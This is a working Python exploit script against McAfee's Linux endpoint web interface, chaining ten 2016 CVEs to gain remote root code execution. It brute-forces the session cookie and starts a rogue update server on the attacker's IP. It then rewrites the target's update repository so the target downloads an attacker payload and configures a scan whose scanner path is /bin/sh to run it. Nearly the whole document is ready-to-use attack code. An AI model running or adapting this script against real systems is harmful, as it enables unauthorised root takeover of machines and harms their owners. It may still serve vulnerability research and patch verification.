'''
Source: https://nation.state.actor/mcafee.html
 
Vulnerabilities
 
CVE-2016-8016: Remote Unauthenticated File Existence Test
CVE-2016-8017: Remote Unauthenticated File Read (with Constraints)
CVE-2016-8018: No Cross-Site Request Forgery Tokens
CVE-2016-8019: Cross Site Scripting
CVE-2016-8020: Authenticated Remote Code Execution & Privilege Escalation
CVE-2016-8021: Web Interface Allows Arbitrary File Write to Known Location
CVE-2016-8022: Remote Use of Authentication Tokens
CVE-2016-8023: Brute Force Authentication Tokens
CVE-2016-8024: HTTP Response Splitting
CVE-2016-8025: Authenticated SQL Injection
When chaned together, these vulnerabilities allow a remote attacker to execute code as root.
'''
#!/bin/python3
import time
import requests
import os
import sys
import re
import threading
import subprocess
from http.server import BaseHTTPRequestHandler, HTTPServer
from socketserver import ThreadingMixIn
 
# Per-target configuration
target_domain="https://10.0.1.130" # https://target_ip
local_ip = '10.0.1.128'                 # Attacker IP for victim to connect back to
authorized_ip="127.0.0.1"           # IP address cookie will be valid for
update_server_port = 8080               # Port update server listens on
delay_seconds = 10                      # How long should the server take to serve the update
target_port = 55443                 # Port to target
 
# Put payload script in payload.sh
 
# Initialization
payload_in_place = threading.Event()
requests.packages.urllib3.disable_warnings()
with open("payload.sh", "r") as f:
    payload = f.read()
 
def pprint(inp, flag=False):
    pad = "#"
    if flag:
        pad = "*"
    print("\n" + pad+ " " + inp)
 
 
def crack_cookie():
    pprint("Cracking Cookie")
 
    # A page that requires authentication
    url = target_domain + ":" + str(target_port) + "/0409/nails?pg=proxy&tplt=productUpdate.html"
 
    # Start at the current time + 100 in case of recent login with clock skew
    date_val = int(time.time()+100)
    cookie_fmt = authorized_ip+"/n/0/%d-checksum// "+authorized_ip + " "*20
 
    # Make requests, print after every 600
    while True:
        cookie = cookie_fmt % date_val
        req_cookie = {"nailsSessionId": cookie}
        r = requests.get(url, cookies=req_cookie, verify=False)
        r.raise_for_status()
 
        if "Set-Cookie" in r.headers:
            valid_cookie = cookie
            timestamp = cookie.split("/")[3].split("-")[0]
            break
 
        elif date_val % 600 == 0:
            print("Now trying  %s" % time.asctime(time.localtime(date_val)))
 
        date_val -= 1
 
    pprint("Cookie Cracked: " + timestamp, True)
    return valid_cookie
 
 
def update_update_server(auth_cookie):
    pprint("Updating update server")
 
    # Replace McAfeeHttp update server with attacker local_ip:update_server_port
    url = target_domain + ":" + str(target_port) + "/0409/nails?pg=proxy&addr=127.0.0.1%3A65443&tplt=" \
    "repository.html&sitelist=add&mon%3A0=db+set+1+_table%3Drepository+status%3D1+siteList%3D%253C%253F" \
    "xml%2520version%253D%25221.0%2522%2520encoding%253D%2522UTF-8%2522%253F%253E%250A%253Cns%253ASiteLists" \
    "%2520xmlns%253Ans%253D%2522naSiteList%2522%2520GlobalVersion%253D%2522PATTeELCQSEhZwxKf4PoXNSY4%2Fg%25" \
    "3D%2522%2520LocalVersion%253D%2522Wed%252C%252030%2520Dec%25202009%252011%253A20%253A59%2520UTC%2522%2" \
    "520Type%253D%2522Client%2522%253E%253CPolicies%2F%253E%253CSiteList%2520Default%253D%25221%2522%2520Na" \
    "me%253D%2522SomeGUID%2522%253E%253CHttpSite%2520Type%253D%2522repository%2522%2520Name%253D%2522McAfee" \
    "Http%2522%2520Order%253D%25221%2522%2520Server%253D%2522"+local_ip+"%253A"+str(update_server_port) \
    + "%2522%2520Enabled%253D%25221%2522%2520Local%253D%25221%2522%253E%253CRelativePath%2F%253E%253CUseAuth%" \
    "253E0%253C%2FUseAuth%253E%253CUserName%253E%253C%2FUserName%253E%253CPassword%2520Encrypted%253D%25220" \
    "%2522%2F%253E%253C%2FHttpSite%253E%253CFTPSite%2520Type%253D%2522fallback%2522%2520Name%253D%2522McAfe" \
    "eFtp%2522%2520Order%253D%25222%2522%2520Server%253D%2522ftp.nai.com%253A21%2522%2520Enabled%253D%25221" \
    "%2522%2520Local%253D%25221%2522%253E%253CRelativePath%253ECommonUpdater%253C%2FRelativePath%253E%253CU" \
    "seAuth%253E1%253C%2FUseAuth%253E%253CUserName%253Eanonymous%253C%2FUserName%253E%253CPassword%2520Encr" \
    "ypted%253D%25221%2522%253ECommonUpdater%40McAfeeB2B.com%253C%2FPassword%253E%253C%2FFTPSite%253E%253C%" \
    "2FSiteList%253E%253C%2Fns%253ASiteLists%253E+_cmd%3Dupdate+&mon%3A1=task+setsitelist&mon%3A2=db+select" \
    "+_show%3DsiteList+_show%3Dstatus+_table%3Drepository&info%3A2=multi%2Cshow&reposProperty=repository&re" \
    "posProperty=fallback&useOfProxy=on"
 
    r = requests.get(url, cookies=auth_cookie, verify=False)
    r.raise_for_status()
    pprint("Updated update server", True)
 
def download_update(req_cookie):
    pprint("Requesting target download payload")
 
    # Send request to make target download payload
    url = target_domain + ":" + str(target_port) + "/0409/nails"
 
    updateName = "update_%d" % int(time.time())
    postdata = ("pg=proxy&addr=127.0.0.1%3A65443&tplt=scheduledTasks.html&scheduleOp=add&mon%3A0=db+set+1+_tab" \
    "le%3Dschedule++taskName%3D{0}+taskType%3DUpdate+taskInfo%3DtoUpdate%3Ddat%253Bengine+timetable%3Dtype%" \
    "3Dunscheduled+status%3DIdle++i_recurrenceCounter%3D0+&mon%3A1=task+nstart+{0}&mon%3A2=db+select+_asc%3D" \
    "taskName+_table%3Dschedule+_show%3Di_taskId+_show%3DtaskName+_show%3DtaskResults+_show%3Dtimetable+_sh" \
    "ow%3DtaskType+_show%3DtaskInfo+_show%3Di_lastRun+_show%3D%24i_lastRun+_show%3Dstatus+_show%3Dprogress+" \
    "_show%3Di_nextRun+_show%3D%24i_nextRun+_show%3Di_duration+_show%3DtaskInfo++_limit%3D50+_offset%3D0&in" \
    "fo%3A2=multi%2Cshow&mon%3A3=db+select+_table%3Dschedule+_show%3Dcount%28*%29&info%3A3=multi%2Cshow&loc" \
    "%3A4=conf+get+browser.resultsPerPage&info%3A4=multi%2Cshow&mon%3A5=task+updatecrontab&info%3A5=multi%2" \
    "Cshow&echo%3A6=1&info%3A6=pageNo&echo%3A7=&info%3A7=selectedTask""").format(updateName)
 
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    r = requests.post(url, data=postdata, cookies=req_cookie, verify=False, headers=headers)
    r.raise_for_status()
 
    pprint("Payload download requested", 1)
 
 
def exec_catalogz(req_cookie):
    pprint("Making target execute payload")
 
    #### Get commit_id and ODS_name
    url = target_domain + ":" + str(target_port) + "/0409/nails?pg=proxy&tplt=schedOnDemand.html&addr=127.0" \
    ".0.1:65443&mon:0=sconf+ODS+select+section%3Dnailsd.profile.ODS&info:0=multi,show,digest&echo:1=ODS&inf" \
    "o:1=profileName&mon:2=sconf+ODS+select+section%3Dnailsd.profile.ODS_default&info:2=multi,show&echo:3=O" \
    "DS_default&info:3=defaultProfileName&mon:4=sconf+ODS+select+attribute%3Dnailsd.oasEnabled&info:4=multi" \
    ",show&mon:5=extensions&info:5=multi,show&mon:6=db+select+_show=max(i_taskId)+_table=schedule&info:6=mu" \
    "lti,show&mon:7=utco&info:7=single,show,serverUtcOffset&echo:8=generate&info:8=profileNameAction"
 
    r = requests.get(url, cookies=req_cookie, verify=False)
    r.raise_for_status()
 
    regex = re.search("\|digest=(.+?)\|", r.text)
    if not regex:
        print("\nERROR: Could not get commit_id when generating evil scan\n")
        return False
 
    commit_id = regex.groups(1)[0]
 
    # Send request to start evil scan
    payload_path = "%2Fopt%2FMcAfee%2Fcma%2Fscratch%2Fupdate%2Fcatalog.z"
    binary_path = "%2Fbin%2Fsh" # Use "%2fbin%2Fstatic-sh" for versions 1.x
 
    url = target_domain + ":" + str(target_port) + "/0409/nails"
 
    ODS_name = "ODS_1"   # This may need to be increased if the name already exists
    scan_name = "scan_%s" % str(int(time.time()))
 
    postdata =  ("pg=proxy&addr=127.0.0.1%3A65443&tplt=scheduledTasks.html&mon%3A0=sconf+{1}+begin&info%3A0=" \
    "multi%2Cshow&mon%3A1=sconf+{1}+delete+{0}+section%3Dnailsd.profile.{1}.filter+section%3Dnailsd.prof" \
    "ile.{1}.action&mon%3A2=sconf+{1}+set+{0}+nailsd.profile.{1}.allFiles%3Dtrue+nailsd.profile.{1}.child" \
    "InitTmo%3D240+nailsd.profile.{1}.cleanChildren%3D2+nailsd.profile.{1}.cleansPerChild%3D10000+nailsd" \
    ".profile.{1}.datPath%3D%2Fopt%2FNAI%2FLinuxShield%2Fengine%2Fdat+nailsd.profile.{1}.decompArchive%3" \
    "Dtrue+nailsd.profile.{1}.decompExe%3Dtrue+nailsd.profile.{1}.engineLibDir%3D%2Fopt%2FNAI%2FLinuxShi" \
    "eld%2Fengine%2Flib+nailsd.profile.{1}.enginePath%3D{3}+nailsd.profile.{1}.factoryI" \
    "nitTmo%3D240+nailsd.profile.{1}.heuristicAnalysis%3Dtrue+nailsd.profile.{1}.macroAnalysis%3Dtrue+na" \
    "ilsd.profile.{1}.maxQueSize%3D32+nailsd.profile.{1}.mime%3Dtrue+nailsd.profile.{1}.noJokes%3Dfalse+" \
    "nailsd.profile.{1}.program%3Dtrue+nailsd.profile.{1}.quarantineChildren%3D1+nailsd.profile.{1}.quar" \
    "antineDirectory%3D%2Fquarantine+nailsd.profile.{1}.quarantineFromRemoteFS%3Dfalse+nailsd.profile.{1" \
    "}.quarantinesPerChild%3D10000+nailsd.profile.{1}.scanChildren%3D2+nailsd.profile.{1}.scanMaxTmo%3D3" \
    "00+nailsd.profile.{1}.scanNWFiles%3Dfalse+nailsd.profile.{1}.scanOnRead%3Dtrue+nailsd.profile.{1}.s" \
    "canOnWrite%3Dtrue+nailsd.profile.{1}.scannerPath%3D{4}+nailsd.profile.{1}.scansPerChild" \
    "%3D10000+nailsd.profile.{1}.slowScanChildren%3D0+nailsd.profile.{1}.filter.0.type%3Dexclude-path+na" \
    "ilsd.profile.{1}.filter.0.path%3D%2Fproc+nailsd.profile.{1}.filter.0.subdir%3Dtrue+nailsd.profile.{" \
    "1}.filter.1.type%3Dexclude-path+nailsd.profile.{1}.filter.1.path%3D%2Fquarantine+nailsd.profile.{1}" \
    ".filter.1.subdir%3Dtrue+nailsd.profile.{1}.filter.extensions.mode%3Dall+nailsd.profile.{1}.filter.e" \
    "xtensions.type%3Dextension+nailsd.profile.{1}.action.Default.primary%3DClean+nailsd.profile.{1}.act" \
    "ion.Default.secondary%3DQuarantine+nailsd.profile.{1}.action.App.primary%3DClean+nailsd.profile.{1}" \
    ".action.App.secondary%3DQuarantine+nailsd.profile.{1}.action.timeout%3DPass+nailsd.profile.{1}.acti" \
    "on.error%3DBlock&mon%3A3=sconf+{1}+commit+{0}&mon%3A4=db+set+{0}+_table%3Dschedule++taskName%3D{2}+" \
    "taskType%3DOn-Demand+taskInfo%3DprofileName%3D{1}%2Cpaths%3Dpath%3A%2Ftmp%3Bexclude%3Atrue+timetabl" \
    "e%3Dtype%3Dunscheduled+progress%3D+status%3DIdle+&mon%3A5=task+nstart+{2}&mon%3A6=db+select+_asc%3D" \
    "taskName+_table%3Dschedule+_show%3Di_taskId+_show%3DtaskName+_show%3DtaskResults+_show%3Dtimetable+" \
    "_show%3DtaskType+_show%3DtaskInfo+_show%3Di_lastRun+_show%3D%24i_lastRun+_show%3Dstatus+_show%3Dpro" \
    "gress+_show%3Di_nextRun+_show%3D%24i_nextRun+_show%3Di_duration+_show%3DtaskInfo++_limit%3D50+_offs" \
    "et%3D0&info%3A6=multi%2Cshow&mon%3A7=db+select+_table%3Dschedule+_show%3Dcount%28*%29&info%3A7=mult" \
    "i%2Cshow&mon%3A8=sconf+ODS+begin&info%3A8=multi%2Cshow%2Cdigest&mon%3A9=task+updatecrontab&info%3A9" \
    "=multi%2Cshow&loc%3A10=conf+get+browser.resultsPerPage&info%3A10=multi%2Cshow&echo%3A11=1&info%3A11" \
    "=pageNo&echo%3A12=&info%3A12=selectedTask").format(commit_id, ODS_name, scan_name,payload_path, binary_path)
 
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    r = requests.post(url, data=postdata, cookies=req_cookie, verify=False, headers=headers)
    r.raise_for_status()
 
    pprint("Payload executed", 1)
 
def start_update_server():
 
    class RequestHandler(BaseHTTPRequestHandler):
        def do_HEAD(s):
            s.send_response(200)
            s.send_header("Content-type", "text/html")
            s.end_headers()
 
        def do_GET(s):
            if s.path == "/catalog.z":
                s.send_response(200)
                s.send_header("Content-type", "text/html")
                s.end_headers()
                s.wfile.write(bytes(payload, "utf-8"))
 
                pprint("Payload placed", 1)
 
                payload_in_place.set()
 
                # Die after sending payload so we send an incomplete response
                raise KillServer
 
            else: # Assume all other requests are for SiteStat - Always increasing version
                s.send_response(200)
                s.send_header("Content-type", "text/xml")
                s.end_headers()
                s.wfile.write(bytes(("""<?xml version="1.0" encoding="UTF-8"?>""" \
                """<SiteStatus Status="Enabled" CatalogVersion="2%d">""" \
                """ </SiteStatus>""") % int(time.time()), "utf-8"))
 
    # Throwing KillServer will shutdown the server ungracefully
    class KillServer(Exception):
        def __str__(self):
            return "Kill Server (not an error)"
 
    # ThreadingMixIn plus support for KillServer exceptions
    class AbortableThreadingMixIn(ThreadingMixIn):
        def process_request_thread(self, request, client_address):
            try:
                self.finish_request(request, client_address)
                self.shutdown_request(request)
            except KillServer:
                pprint("Killing update server dirtily")
                self.shutdown_request(request)
                self.shutdown() # Only if we want to shutdown
            except:
                self.handle_error(request, client_address)
                self.shutdown_request(request)
 
 
    class BackgroundHTTPSrv(AbortableThreadingMixIn, HTTPServer):
        pass
 
    pprint("Launching update server")
 
    srv = BackgroundHTTPSrv((local_ip, update_server_port), RequestHandler)
    threading.Thread(target=srv.serve_forever).start()
 
    pprint("Update server started", 1)
    return srv
 
 
####################################################################################
####################################################################################
 
pprint("Attacking %s" % target_domain, 1)
 
# Crack the auth cookie
cookie = crack_cookie()
auth_cookie = {"nailsSessionId": cookie}
 
# Start our update server locally
srv = start_update_server()
 
# Force target to use our update server
update_update_server(auth_cookie)
 
# Make target download an update from us
download_update(auth_cookie)
 
# Block until the target downloads our payload,
payload_in_place.wait()
 
# Shutdown our update server
srv.shutdown()
 
# Execute /bin/sh -(?) catalog.z
exec_catalogz(auth_cookie)

